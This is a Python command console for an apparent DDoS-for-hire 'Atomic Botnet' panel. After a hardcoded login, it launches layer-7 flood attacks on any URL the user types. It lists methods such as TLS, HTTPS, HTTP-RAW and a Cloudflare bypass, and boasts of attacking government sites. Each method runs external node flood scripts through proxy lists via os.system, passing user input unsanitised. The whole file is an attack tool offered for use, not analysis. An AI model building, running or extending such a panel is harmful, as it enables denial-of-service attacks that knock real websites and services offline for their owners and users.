import socket
import os
import requests
import random
import getpass
import time
import sys
from pystyle import Colors, Colorate

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')
    
proxys = open('proxy.txt').readlines()
bots = len(proxys)
bots_str = str(bots)

def si():
    print(Colorate.Diagonal(Colors.yellow_to_red, "Welcome To Atomic DDoS Panel | User: root | Plan: VVIP | Proxy: " + bots_str + " | Happy To Use"))
    print("")
  
def layer7():
    clear()
    si()
    print(Colorate.Horizontal(Colors.yellow_to_red, ''' 
            LIST LAYER7 METHODS
            
QBots - POWER METHODS ATTACKING GOV AND THE REST [VVIP]
TLS - POWERFULL TLS METHODS [VVIP]
HTTPS - SEND DDOS ATTACK WITH HTTP/1.1 [BASIC]
HTTPSV2 - SEND DDOS ATTACK WITH HTTP/1.2 [BASIC]
CF - NORMAL CF BYPASS

HOW TO USE
Method https://example.com 120         TLS URL TIME
'''))

def menu():
    clear()
    print(Colorate.Diagonal(Colors.yellow_to_red, "Welcome To Atomic DDoS Panel | User: owner | Plan: VVIP | Proxy: " + bots_str + " | Happy To Use"))
    print("")
    banner = '''
        ⠀⠀⠀⠀⠀⠀⣀⣀⣤⣤⣤⣤⡼⠀⢀⡀⣀⢱⡄⡀⠀⠀⠀⢲⣤⣤⣤⣤⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣾⣿⣿⣿⣿⣿⡿⠛⠋⠁⣤⣿⣿⣿⣧⣷⠀⠀⠘⠉⠛⢻⣷⣿⣽⣿⣿⣷⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣴⣞⣽⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠠⣿⣿⡟⢻⣿⣿⣇⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣟⢦⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣠⣿⡾⣿⣿⣿⣿⣿⠿⣻⣿⣿⡀⠀⠀⠀⢻⣿⣷⡀⠻⣧⣿⠆⠀⠀⠀⠀⣿⣿⣿⡻⣿⣿⣿⣿⣿⠿⣽⣦⡀⠀⠀⠀⠀
⠀⠀⠀⠀⣼⠟⣩⣾⣿⣿⣿⢟⣵⣾⣿⣿⣿⣧⠀⠀⠀⠈⠿⣿⣿⣷⣈⠁⠀⠀⠀⠀⣰⣿⣿⣿⣿⣮⣟⢯⣿⣿⣷⣬⡻⣷⡄⠀⠀⠀
⠀⠀⢀⡜⣡⣾⣿⢿⣿⣿⣿⣿⣿⢟⣵⣿⣿⣿⣷⣄⠀⣰⣿⣿⣿⣿⣿⣷⣄⠀⢀⣼⣿⣿⣿⣷⡹⣿⣿⣿⣿⣿⢿⣿⣮⡳⡄⠀⠀
⠀⢠⢟⣿⡿⠋⣠⣾⢿⣿⣿⠟⣾⢟⣿⢿⣿⣿⣿⣾⡿⠟⠻⣿⣻⣿⣏⠻⣿⣾⣿⣿⣿⣿⡛⣿⡌⠻⣿⣿⡿⣿⣦⡙⢿⣿⡝⣆⠀
⠀⢯⣿⠏⣠⠞⠋⠀⣠⡿⠋⢀⣿⠁⢸⡏⣿⠿⣿⣿⠃⢠⣴⣾⣿⣿⡟⠀⠘⢹⣿⠟⣿⣾⣷⠈⣿⡄⠘⢿⣦⠀⠈⠻⣆⠙⣿⣜⠆
⢀⣿⠃⡴⠃⢀⡠⠞⠋⠀⠀⠼⠋⠀⠸⡇⠻⠀⠈⠃⠀⣧⢋⣼⣿⣿⣿⣷⣆⠀⠈⠁⠀⠟⠁⡟⠀⠈⠻⠀⠀⠉⠳⢦⡀⠈⢣⠈⢿⡄
⣸⠇⢠⣷⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⠿⠿⠋⠀⢻⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢾⣆⠈⣷
⡟⠀⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣶⣤⡀⢸⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡄⢹
⡇⠀⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠈⣿⣼⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠃⢸
⢡⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⠶⣶⡟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼
⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡾⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡁⢠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣼⣀⣠⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

                 
                      | Atomic Botnet |

Author: People's Liberation Front

Type methods To See Layer7 Methods | Write "L7/l7" to view methods.
'''
    print(Colorate.Diagonal(Colors.yellow_to_red, banner))
def main():
    menu()
    while(True):
        cnc = input(Colorate.Diagonal(Colors.yellow_to_red, "root@PLFhack#~"))
        if cnc == "Method" or cnc == "METHOD" or cnc == "Methods" or cnc == "METHODS":
            layer7()
        elif cnc == "clear" or cnc == "CLEAR" or cnc == "CLS" or cnc == "cls":
            main()
        elif cnc == "ports" or cnc == "port" or cnc == "PORTS" or cnc == "PORT":
            ports()

        elif "TLS" in cnc:
            try: 
                host = cnc.split()[1]
                time = cnc.split()[2]
                print("Attacking " + host + " For " + time + " Using Method TLS")
                os.system(f'node tls {host} {time} 120 35 10 proxy.txt')
            except IndexError:
                print('Usage: METHOD URL TIME');
                print('Example: METHOD URL TIME');
                
        elif "QBot" in cnc:
            try: 
                host = cnc.split()[1]
                time = cnc.split()[2]
                print("Attacking " + host + " For " + time + " Using Method QBot")
                os.system(f'node QBot {host} {time} 120 35 10 proxy.txt')
            except IndexError:
                print('Usage: METHOD URL TIME');
                print('Example: METHOD URL TIME');
                
        elif "HTTPS" in cnc:
            try: 
                host = cnc.split()[1]
                time = cnc.split()[2]
                print("Attacking " + host + " For " + time + " Using Method HTTPS")
                os.system(f'node https {host} {time} 120 35 10 proxy.txt bypass')
            except IndexError:
                print('Usage: METHOD URL TIME');
                print('Example: METHOD URL TIME');             
                
        elif "HTTPSV2" in cnc:
            try: 
                host = cnc.split()[1]
                time = cnc.split()[2]
                print("Attacking " + host + " For " + time + " Using Method HTTPSV2")
                os.system(f'node https {host} {time} 120 35 10 proxy.txt bypass')
                os.system(f'node https {host} {time} 120 35 10 proxy.txt bypass ')
            except IndexError:
                print('Usage: METHOD URL TIME');
                print('Example: METHOD URL TIME');
                
        elif "HTTPSV3" in cnc:
            try: 
                host = cnc.split()[1]
                time = cnc.split()[2]
                print("Attacking " + host + " For " + time + " Using Method CF")
                os.system(f'node httpsv3 {host} {time} 120 35 10 proxy.txt bypass')
                os.system(f'node httpsv3 {host} {time} 120 35 10 proxy.txt')
            except IndexError:
                print('Usage: METHOD URL TIME');
                print('Example: METHOD URL TIME');

        elif "HTTP-RAW" in cnc:
            try: 
                host = cnc.split()[1]
                time = cnc.split()[2]
                print("Attacking " + host + " For " + time + " Using Method HTTP-RAW")
                os.system(f'node HTTP-RAW {host} {time} 120 35 10 proxy.txt')
            except IndexError:
                print('Usage: METHOD URL TIME');
                print('Example: METHOD URL TIME');


        elif "qwe" in cnc:
            try: 
                host = cnc.split()[1]
                time = cnc.split()[2]
                print("Attacking " + host + " For " + time + " Using Method qwe")
                os.system(f'node qwe {host} {time} 120 35 10 proxy.txt')
            except IndexError:
                print('Usage: METHOD URL TIME');
                print('Example: METHOD URL TIME');

        elif "Rapaid-Lost" in cnc:
            try: 
                host = cnc.split()[1]
                time = cnc.split()[2]
                print("Attacking " + host + " For " + time + " Using Method Rapaid-Lost")
                os.system(f'node Rapaid-Lost {host} {time} 120 35 10 proxy.txt')
            except IndexError:
                print('Usage: METHOD URL TIME');
                print('Example: METHOD URL TIME');

  
        elif "TLS-REMAKE" in cnc:
            try: 
                host = cnc.split()[1]
                time = cnc.split()[2]
                print("Attacking " + host + " For " + time + " Using Method TLS-REMAKE")
                os.system(f'node TLS-REMAKE {host} {time} 120 35 10 proxy.txt')
            except IndexError:
                print('Usage: METHOD URL TIME');
                print('Example: METHOD URL TIME');


        elif "help" in cnc:
            print(Colorate.Horizontal(Colors.yellow_to_red(''' 
METHODS- SEE ALL LAYER7 METHOD
HELP - FOR HELP
CLEAR - CLEAR TERMINAL
''')))
        else:
            try:
                cmmnd = cnc.split()[0]
                print("Command: [ " + cmmnd + " ] Not Found!")
            except IndexError:
                pass


def login():
    clear()
    user = "Owner"
    passwd = "131313"
    username = input("</> Username: ")
    password = getpass.getpass(prompt='</> Password: ')
    if username != user or password != passwd:
        print("")
        print("Password/Username Salah")        
        sys.exit(1)
    elif username == user and password == passwd:
        print("Welcome To Atomic Botnet")
        time.sleep(0.3)
        main()

login()